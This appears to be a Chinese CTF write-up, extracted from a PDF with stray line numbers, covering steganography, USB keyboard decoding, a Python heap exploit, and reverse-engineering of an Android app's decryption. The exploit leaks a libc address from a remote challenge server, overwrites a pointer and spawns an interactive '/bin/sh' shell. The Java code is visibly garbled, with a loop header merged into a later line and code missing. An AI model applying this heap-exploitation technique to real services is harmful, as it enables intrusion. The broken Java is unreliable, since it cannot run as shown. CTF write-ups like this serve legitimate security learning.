1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
Misc
m1bmp
LSB隐写
    cmd2(index)
    cmd2(phone)
    cmd2(name)
    cmd3(note)
#p = process('./hello')
p = remote("119.3.81.43",49153)
#gdb.attach(p)
new("1","kirin",0x80,"1\n")#unsorted bin
new("2","kirin",0x68,"1\n")
free(0)
new("3","kirin",0x8,"1"*9)
show(2)
p.recvuntil("1"*8)
libc= u64(p.recvuntil("\n").strip().ljust(8,"\x00"))-0x3c4b31
print hex(libc)
#edit(1,"kirin","/bin/sh\x00"+"a"*5+p64(libc+0x3c67a8),p64(libc+0x0453a0)+'
\n')
edit(1,"111","1"*8+"a"*5+p64(libc+0x3c67a8),p64(libc+0x0453a0)+'\n')
edit(2,"222","/bin/sh\x00","/bin/sh\x00\n")
#gdb.attach(p)
free(2)
p.interactive()
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
m0usb
usb键盘+01248密码
https://github.com/WangYihang/UsbKeyboardDataHacker
Mobile
hellehellokey
360加固，脱壳
key都给了，抄⼀下解密算法
c = '884080810882108108821042084010421'
frags = c.split('0')
flag = ''
for frag in frags:
    flag += (chr(64+sum(map(int,frag))))
print(flag)
1
2
3
4
5
6
import java.math.BigDecimal;
import java.util.Arrays;
import java.security.Key;
import java.security.SecureRandom;
import java.security.Security;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.NoSuchProviderException;
import java.security.SecureRandom;
import java.security.UnrecoverableEntryException;
import java.security.cert.CertificateException;
import java.security.spec.InvalidKeySpecException;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
import java.math.BigInteger;
import java.util.Base64;
import java.util.Base64.Decoder;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
public class HelloWorld {
  public static BigDecimal ca(BigDecimal[][] arg6) {
        return arg6[0][0].multiply(arg6[1][1]).multiply(arg6[2]
[2]).subtract(arg6[0][0].multiply(arg6[1][2]).multiply(arg6[2]
[1])).subtract(arg6[0][1].multiply(arg6[1][0]).multiply(arg6[2]
[2])).add(arg6[0][1].multiply(arg6[1][2]).multiply(arg6[2]
[0])).add(arg6[0][2].multiply(arg6[1][0]).multiply(arg6[2]
[1])).subtract(arg6[0][2].multiply(arg6[1][1]).multiply(arg6[2][0]));
    }
    public static Key AAA(String arg4, byte[] aa) throws 
InvalidKeySpecException, NoSuchPaddingException, InvalidKeyException, 
NoSuchAlgorithmException {
        Security.addProvider( new BouncyCastleProvider());
        System.out.println(new SecureRandom().generateSeed(8));
        // Security.insertProviderAt(new BouncyCastleProvider(), 1);
        PBEKeySpec v0 = new PBEKeySpec(arg4.toCharArray(), aa, 10000, 
0x80);
        return SecretKeyFactory.getInstance("PBEWITHSHA256AND128BITAES-
CBC-BC").generateSecret(v0);
    }
    public static void main(String []args) throws InvalidKeyException, 
BadPaddingException, NoSuchAlgorithmException, NoSuchPaddingException, 
InvalidKeySpecException, IllegalBlockSizeException {
        System.out.println("a");
        String v1 = 
"-5318281467173987652_AWCi9lUPkJtHXiNJahfmbp0uI3NfTw6C+xtqctVioZBf9Oa56x/l
HRDRJg7eAKfL";
    String[] v2222 = {
        "45643_146929454710883133724439317",
"5141_146806547890187159627936211",
"12657_146808996664410987156248503",
"59203_147074971414771841621238397",
"3599_146806432347879873041767617",
"59190_147074794513918416536895817",
"34014_146857310776799437987522057"
    };
        BigDecimal[] v4_3 = new BigDecimal[7];
        BigDecimal[] v3_2 = new BigDecimal[7];
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
        int v7_1;
        for(v7_1 = 0; true; ++v7_1) {
            String[] v8_4 = v2222;
            if(v7_1 >= v8_4.length) {
                break;
            }
            String[] v8_5 = v8_4[v7_1].split("_");
            v4_3[v7_1] = new BigDecimal(v8_5[0]);
            v3_2[v7_1] = new BigDecimal(v8_5[1]);
        }
        BigDecimal[] v2R = v4_3;
        BigDecimal[] v2S = v3_2;
        BigDecimal[][] v3_3 = new BigDecimal[4][4];
        BigDecimal[][] v4_4 = new BigDecimal[4][4];
        BigDecimal v7_2 = new BigDecimal("1");
        int v9_1;
        for(v9_1 = 0; v9_1 = v4_5) {
            int v4_6 = v6 - 1;
            int v8_7;
            for(v8_7 = v4_6; v8_7 >= 0; --v8_7) {
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
                v7_3 = v7_3.multiply(v2_1[v6].subtract(v2_1[v8_7]));
            }
            v6 = v4_6;
            v4_5 = 1;
        }
        BigDecimal[][] v2_2 = new BigDecimal[3][3];
        BigDecimal[][] v4_7 = new BigDecimal[3][3];
        BigDecimal[][] v6_1 = new BigDecimal[3][3];
        BigDecimal[][] v8_8 = new BigDecimal[3][3];
        int v9_2;
        for(v9_2 = 0; v9_2 < v3_3.length; ++v9_2) {
            int v11_1;
            for(v11_1 = 0; v11_1 < v3_3.length; ++v11_1) {
                if(v9_2 != 0 && v11_1 != 0) {
                    v2_2[v9_2 - 1][v11_1 - 1] = v3_3[v9_2][v11_1];
                }
                if(v9_2 != 0 && v11_1 != 1) {
                    if(v11_1 == 0) {
                        v4_7[v9_2 - 1][v11_1] = v3_3[v9_2][v11_1];
                    }
                    else {
                        v4_7[v9_2 - 1][v11_1 - 1] = v3_3[v9_2][v11_1];
                    }
                }
                if(v9_2 != 0 && v11_1 != 2) {
                    if(v11_1 != 1 && v11_1 != 0) {
                        v6_1[v9_2 - 1][v11_1 - 1] = v3_3[v9_2][v11_1];
                    }
                    else {
                        v6_1[v9_2 - 1][v11_1] = v3_3[v9_2][v11_1];
                    }
                }
                if(v9_2 != 0 && v11_1 != 3) {
                    v8_8[v9_2 - 1][v11_1] = v3_3[v9_2][v11_1];
                }
            }
        }
        BigDecimal v2_3 = v3_3[0][0].multiply(ca(v2_2)).subtract(v3_3[0]
[1].multiply(ca(v4_7))).add(v3_3[0]
[2].multiply(ca(v6_1))).subtract(v3_3[0][3].multiply(ca(v8_8)));
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
        if(v2_3.doubleValue() < 0) {
            v7_3 = v7_3.multiply(new BigDecimal("-1"));
        }
        System.out.println(v2_3.divide(v7_3, 4));
        String v0j0 = new String(v2_3.divide(v7_3, 
4).toBigInteger().toByteArray());
        String v2_5 = v0j0;
        String v3_5 = v1.split("_")[1];
        byte[] AA = new BigInteger(v1.split("_")[0]).toByteArray();
        Decoder decoder = Base64.getDecoder();
        //sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
        //byte[] v1_1 = Base64.decode(v3_5, 2);
        // byte[] v1_1 = decoder.decode(v3_5);
        byte[] v1_1 = {(byte)1, (byte)96, (byte)162, (byte)246, (byte)85, 
(byte)15, (byte)144, (byte)155, (byte)71, (byte)94, (byte)35, (byte)73, 
(byte)106, (byte)23, (byte)230, (byte)110, (byte)157, (byte)46, (byte)35, 
(byte)115, (byte)95, (byte)79, (byte)14, (byte)130, (byte)251, (byte)27, 
(byte)106, (byte)114, (byte)213, (byte)98, (byte)161, (byte)144, (byte)95, 
(byte)244, (byte)230, (byte)185, (byte)235, (byte)31, (byte)229, (byte)29, 
(byte)16, (byte)209, (byte)38, (byte)14, (byte)222, (byte)0, (byte)167, 
(byte)203};
        System.out.println(v3_5);
        // System.out.println(v1_1);
    System.out.println(v2_5);
    Security.addProvider( new BouncyCastleProvider());
    Key v2_6 = AAA(v2_5, AA);
    System.out.println(v2_6);
        Cipher v3_6 = Cipher.getInstance("PBEWITHSHA256AND128BITAES-CBC-
BC");
        v3_6.init(2, v2_6);
        String vvv = new String(v3_6.doFinal(v1_1));
    System.out.println(vvv);
    }
}
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172